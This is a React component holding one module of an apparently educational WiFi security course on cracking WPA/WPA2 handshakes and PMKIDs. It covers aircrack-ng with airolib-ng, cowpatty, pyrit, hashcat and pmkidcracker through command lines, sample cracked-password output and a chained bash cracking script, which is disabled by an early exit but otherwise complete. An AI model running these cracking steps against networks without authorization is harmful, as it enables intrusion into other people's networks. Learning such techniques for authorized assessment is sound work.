import { Lock, AlertTriangle, Info, Cpu, Key, Database } from "lucide-react";
import { CommandBlock } from "../CommandBlock";
import { ScriptBlock } from "../ScriptBlock";

export const AdvancedCracking = () => {
  const crackingScript = `#!/bin/bash
# 2027 edition: historical automation disabled; fails before any state change.
printf 'Disabled review artifact. Use synthetic practice; no RF action permitted.\\n' >&2
exit 64

# Advanced WiFi Password Cracking Toolkit
# Runs Cowpatty, Pyrit, Aircrack-ng, and Pmkidcracker
# Usage: sudo bash advanced_crack.sh <capture_file> [wordlist]

set -e

CAPTURE=\${1:?"Usage: \$0 <capture_file> [wordlist]"}
WORDLIST=\${2:-/usr/share/wordlists/rockyou.txt}

RED='\\033[0;31m'
GREEN='\\033[0;32m'
YELLOW='\\033[1;33m'
CYAN='\\033[0;36m'
NC='\\033[0m'

print_status() { echo -e "\${CYAN}[*]\${NC} \$1"; }
print_success() { echo -e "\${GREEN}[+]\${NC} \$1"; }
print_warning() { echo -e "\${YELLOW}[!]\${NC} \$1"; }

echo "=========================================="
echo "   Advanced WiFi Cracking Toolkit"
echo "=========================================="
echo ""
print_status "Capture: \$CAPTURE"
print_status "Wordlist: \$WORDLIST"
echo ""

# Detect SSID from capture
SSID=\$(aircrack-ng \$CAPTURE 2>/dev/null | grep -oP '\\b\\S+\\s*\$' | head -1 | xargs)
print_status "Detected SSID: \$SSID"

# Method 1: Aircrack-ng (baseline)
print_status "Method 1: Aircrack-ng (CPU dictionary)..."
timeout 300 aircrack-ng -w "\$WORDLIST" "\$CAPTURE" 2>/dev/null && exit 0 || true

# Method 2: Cowpatty
if command -v cowpatty &>/dev/null; then
    print_status "Method 2: Cowpatty..."
    timeout 300 cowpatty -f "\$WORDLIST" -r "\$CAPTURE" -s "\$SSID" 2>/dev/null || true
fi

# Method 3: Pyrit
if command -v pyrit &>/dev/null; then
    print_status "Method 3: Pyrit (GPU-accelerated)..."
    pyrit -r "\$CAPTURE" -i "\$WORDLIST" attack_passthrough 2>/dev/null || true
fi

# Method 4: Convert and use hashcat
if command -v hashcat &>/dev/null; then
    print_status "Method 4: Hashcat (GPU)..."
    HASH_FILE="\${CAPTURE%.cap}.hc22000"
    if command -v hcxpcapngtool &>/dev/null; then
        hcxpcapngtool -o "\$HASH_FILE" "\$CAPTURE" 2>/dev/null
        hashcat -m 22000 "\$HASH_FILE" "\$WORDLIST" --status -O 2>/dev/null || true
    fi
fi

# Method 5: Pmkidcracker
if [ -f /opt/pmkidcracker/pmkidcracker.py ]; then
    PMKID_FILE="\${CAPTURE%.cap}.pmkid"
    if [ -f "\$PMKID_FILE" ]; then
        print_status "Method 5: Pmkidcracker..."
        python3 /opt/pmkidcracker/pmkidcracker.py -P "\$PMKID_FILE" -w "\$WORDLIST" || true
    fi
fi

echo ""
print_status "All cracking methods completed. Check output above for results."`;

  return (
    <section className="py-16">
      <div className="container mx-auto px-4">
        <div className="max-w-4xl mx-auto">
          <div className="flex items-center gap-3 mb-6">
            <div className="w-10 h-10 rounded-lg bg-primary/20 flex items-center justify-center">
              <Lock className="w-5 h-5 text-primary" />
            </div>
            <div>
              <span className="text-xs font-mono text-primary">MODULE 13</span>
              <h2 className="text-2xl font-bold text-foreground">Advanced Cracking & Password Recovery</h2>
            </div>
          </div>

          <p className="text-muted-foreground mb-8">
            Beyond basic aircrack-ng and hashcat (Module 04), professional assessments use specialized 
            cracking tools. This module covers Cowpatty, Pyrit, Pmkidcracker, and advanced Aircrack-ng 
            techniques for comprehensive password recovery.
          </p>

          {/* Aircrack-ng Advanced */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
              <Key className="w-5 h-5 text-primary" />
              Aircrack-ng — Advanced Techniques
            </h3>
            <div className="space-y-3 text-sm text-muted-foreground">
              <p>
                Module 04 covered basic aircrack-ng. Here we explore advanced features: database mode, 
                optimized wordlists, airolib-ng precomputation, and multi-capture cracking.
              </p>
            </div>
          </div>

          <h3 className="text-lg font-semibold text-foreground mb-4">Advanced Aircrack-ng</h3>
          <div className="space-y-4 mb-8">
            <CommandBlock
              command="airolib-ng pmk_db --import essid target_ssids.txt"
              description="Create PMK precomputation database"
              explanation="airolib-ng precomputes PMKs (PBKDF2 hashes) for specific SSIDs. Dramatically speeds up future cracking of same SSIDs."
            />
            <CommandBlock
              command="airolib-ng pmk_db --import passwd /usr/share/wordlists/rockyou.txt"
              description="Import passwords into database"
              explanation="Imports wordlist into the database. PMKs will be computed for each SSID+password combination."
            />
            <CommandBlock
              command="airolib-ng pmk_db --batch"
              description="Batch compute PMKs"
              explanation="Precomputes all PMKs. This is CPU-intensive but only done once. Future cracks against these SSIDs are nearly instant."
            />
            <CommandBlock
              command="aircrack-ng -r pmk_db handshake.cap"
              description="Crack using precomputed database"
              explanation="-r uses the airolib-ng database instead of a wordlist. Cracking is instant since PMKs are already computed."
            />
            <CommandBlock
              command="aircrack-ng -w - handshake.cap <<< $(crunch 8 8 0123456789)"
              description="Aircrack-ng with crunch (brute force)"
              explanation="Pipe crunch output directly to aircrack-ng for brute-force attack. Here: all 8-digit numeric passwords."
            />
            <CommandBlock
              command="aircrack-ng -w /usr/share/wordlists/rockyou.txt -l cracked_key.txt handshake.cap"
              description="Save cracked key to file"
              explanation="-l saves the cracked password to a file. Useful in scripts and for reporting."
            />
          </div>

          {/* Cowpatty */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
              <Database className="w-5 h-5 text-accent" />
              Cowpatty — WPA-PSK Auditing
            </h3>
            <div className="space-y-3 text-sm text-muted-foreground">
              <p>
                <strong className="text-foreground">What is Cowpatty?</strong> A dedicated WPA-PSK cracking tool 
                that supports both dictionary attacks and precomputed PMK hash tables (rainbow tables for WPA). 
                Predates hashcat's WPA support and remains useful for specific workflows.
              </p>
              <p>
                <strong className="text-foreground">Key Advantage:</strong> Cowpatty's precomputed hash file (.cow) 
                format allows near-instant cracking if you've precomputed PMKs for common SSIDs.
              </p>
            </div>
          </div>

          <h3 className="text-lg font-semibold text-foreground mb-4">Cowpatty Usage</h3>
          <div className="space-y-4 mb-8">
            <CommandBlock
              command="sudo apt install -y cowpatty"
              description="Install Cowpatty"
              explanation="Available in Kali repos. Lightweight WPA cracking tool."
            />
            <CommandBlock
              command="cowpatty -f /usr/share/wordlists/rockyou.txt -r handshake.cap -s TargetNetwork"
              description="Dictionary attack with Cowpatty"
              explanation="-f wordlist, -r capture file, -s SSID (required — PMK derivation depends on SSID). Speed: ~800 passwords/sec on Pi4."
              output={`cowpatty 4.8 - WPA-PSK dictionary attack

Collected all necessary data to mount crack against WPA2/PSK passphrase.
Starting dictionary attack. Please be patient.

The PSK is "Summer2024!".

8342 passphrases tested in 10.43 seconds: 800.00 passphrases/second`}
            />
            <CommandBlock
              command="genpmk -f /usr/share/wordlists/rockyou.txt -s TargetNetwork -d precomputed.cow"
              description="Precompute PMK hash table"
              explanation="genpmk (included with cowpatty) precomputes PBKDF2 hashes for a specific SSID. Saves to .cow file. Very slow but done once."
            />
            <CommandBlock
              command="cowpatty -d precomputed.cow -r handshake.cap -s TargetNetwork"
              description="Crack using precomputed hashes"
              explanation="-d uses precomputed hash file instead of -f wordlist. Near-instant cracking since PBKDF2 is already done."
              output={`Using precomputed hash file: precomputed.cow
The PSK is "Summer2024!".
14344391 passphrases tested in 0.84 seconds: 17076654.76 passphrases/second`}
            />
          </div>

          {/* Pyrit */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
              <Cpu className="w-5 h-5 text-success" />
              Pyrit — GPU-Accelerated WPA Cracking
            </h3>
            <div className="space-y-3 text-sm text-muted-foreground">
              <p>
                <strong className="text-foreground">What is Pyrit?</strong> A GPGPU-accelerated WPA/WPA2-PSK 
                cracker. Uses OpenCL/CUDA to leverage GPU power for PMK computation. Also supports distributed 
                cracking across multiple machines and persistent PMK databases.
              </p>
              <p>
                <strong className="text-foreground">Why Use Pyrit?</strong> While hashcat is generally faster, 
                Pyrit's persistent database approach is useful for recurring assessments against the same SSIDs. 
                Precompute once, crack instantly forever.
              </p>
            </div>
          </div>

          <h3 className="text-lg font-semibold text-foreground mb-4">Pyrit Setup & Usage</h3>
          <div className="space-y-4 mb-8">
            <CommandBlock
              command="sudo apt install -y pyrit"
              description="Install Pyrit"
              explanation="Available in Kali repos. GPU support requires OpenCL drivers."
            />
            <CommandBlock
              command="pyrit list_cores"
              description="Check available compute cores"
              explanation="Shows CPU cores and GPU devices available for cracking. More cores = faster cracking."
              output={`Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg
The following cores seem available...
#1:  'CPU-Core (SSE2)'
#2:  'CPU-Core (SSE2)'
#3:  'CPU-Core (SSE2)'
#4:  'CPU-Core (SSE2)'`}
            />
            <CommandBlock
              command="pyrit -r handshake.cap -i /usr/share/wordlists/rockyou.txt attack_passthrough"
              description="Direct passthrough attack"
              explanation="Reads passwords from wordlist and tests them directly against the capture. No precomputation. Similar to aircrack-ng but GPU-accelerated."
            />
            <CommandBlock
              command="pyrit -e TargetNetwork create_essid"
              description="Create ESSID in Pyrit database"
              explanation="Adds the target SSID to Pyrit's internal database for precomputation."
            />
            <CommandBlock
              command="pyrit -i /usr/share/wordlists/rockyou.txt import_passwords"
              description="Import passwords to database"
              explanation="Imports wordlist into Pyrit's database. Passwords are stored for batch computation."
            />
            <CommandBlock
              command="pyrit batch"
              description="Batch precompute PMKs"
              explanation="Computes all SSID+password PMK combinations and stores them. Progress is saved — can be interrupted and resumed."
              output={`Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg
Connecting to storage at 'file://'...
Working on ESSID 'TargetNetwork'
Processed 50000/14344391 (0.35%); 3500 PMKs/s; ETA: 1h 8min`}
            />
            <CommandBlock
              command="pyrit -r handshake.cap attack_db"
              description="Crack using precomputed database"
              explanation="Uses precomputed PMKs from the database. Extremely fast since all PBKDF2 computation is done."
            />
            <CommandBlock
              command="pyrit -r handshake.cap analyze"
              description="Analyze capture file"
              explanation="Shows details about the capture: handshake quality, BSSID, ESSID, number of EAPOL frames."
              output={`Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg
Parsing file 'handshake.cap'...

#1: AccessPoint AA:BB:CC:DD:EE:FF ('TargetNetwork')
  #1: Station 11:22:33:44:55:66, 4 handshake(s):
    #1: HMAC_SHA1_AES, good, spread 1
    #2: HMAC_SHA1_AES, good, spread 1`}
            />
          </div>

          {/* Pmkidcracker */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
              <Lock className="w-5 h-5 text-warning" />
              Pmkidcracker — Dedicated PMKID Cracker
            </h3>
            <div className="space-y-3 text-sm text-muted-foreground">
              <p>
                <strong className="text-foreground">What is Pmkidcracker?</strong> A lightweight Python tool 
                specifically designed for cracking PMKID hashes. While hashcat handles PMKIDs in mode 22000, 
                Pmkidcracker is useful for quick tests and environments without GPU.
              </p>
            </div>
          </div>

          <div className="space-y-4 mb-8">
            <CommandBlock
              command="cd /opt && sudo git clone https://github.com/s77rt/pmkidcracker.git"
              description="Install Pmkidcracker"
              explanation="Clone from GitHub. Pure Python — no GPU required."
            />
            <CommandBlock
              command="python3 /opt/pmkidcracker/pmkidcracker.py -P pmkid_hash.txt -w /usr/share/wordlists/rockyou.txt"
              description="Crack PMKID hash"
              explanation="-P PMKID hash file (from hcxpcapngtool), -w wordlist. CPU-only but useful for quick checks."
            />
            <CommandBlock
              command="hcxpcapngtool -o pmkid_hash.txt capture.pcapng && python3 /opt/pmkidcracker/pmkidcracker.py -P pmkid_hash.txt -w top10000.txt"
              description="Extract and crack PMKID in one step"
              explanation="Extract PMKIDs from capture, then crack with a focused wordlist. Faster than hashcat for small wordlists on CPU-only systems."
            />
          </div>

          {/* Cracking Strategy */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3">Cracking Tool Decision Matrix</h3>
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="border-b border-border">
                    <th className="text-left py-2 pr-4 text-primary">Tool</th>
                    <th className="text-left py-2 pr-4 text-foreground">GPU</th>
                    <th className="text-left py-2 pr-4 text-foreground">Precompute</th>
                    <th className="text-left py-2 pr-4 text-foreground">Speed (Pi4)</th>
                    <th className="text-left py-2 text-foreground">Best For</th>
                  </tr>
                </thead>
                <tbody className="text-muted-foreground">
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4 font-mono text-primary">Hashcat</td>
                    <td className="py-2 pr-4">✅</td>
                    <td className="py-2 pr-4">❌</td>
                    <td className="py-2 pr-4">~2K/s (CPU)</td>
                    <td className="py-2">GPU cracking, rules</td>
                  </tr>
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4 font-mono text-primary">Aircrack-ng</td>
                    <td className="py-2 pr-4">❌</td>
                    <td className="py-2 pr-4">✅ (airolib)</td>
                    <td className="py-2 pr-4">~2K/s</td>
                    <td className="py-2">Quick tests, airolib DB</td>
                  </tr>
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4 font-mono text-primary">Cowpatty</td>
                    <td className="py-2 pr-4">❌</td>
                    <td className="py-2 pr-4">✅ (.cow)</td>
                    <td className="py-2 pr-4">~800/s → instant</td>
                    <td className="py-2">Precomputed tables</td>
                  </tr>
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4 font-mono text-primary">Pyrit</td>
                    <td className="py-2 pr-4">✅</td>
                    <td className="py-2 pr-4">✅ (DB)</td>
                    <td className="py-2 pr-4">~3.5K/s</td>
                    <td className="py-2">Persistent DB, recurring</td>
                  </tr>
                  <tr>
                    <td className="py-2 pr-4 font-mono text-primary">Pmkidcracker</td>
                    <td className="py-2 pr-4">❌</td>
                    <td className="py-2 pr-4">❌</td>
                    <td className="py-2 pr-4">~500/s</td>
                    <td className="py-2">Quick PMKID checks</td>
                  </tr>
                </tbody>
              </table>
            </div>
          </div>

          {/* Automation Script */}
          <h3 className="text-lg font-semibold text-foreground mb-4 mt-8">Automation Script</h3>
          <ScriptBlock
            title="Advanced WiFi Cracking Toolkit"
            filename="advanced_crack.sh"
            language="bash"
            description="Runs all cracking tools sequentially: Aircrack-ng → Cowpatty → Pyrit → Hashcat → Pmkidcracker"
            code={crackingScript}
          />
        </div>
      </div>
    </section>
  );
};
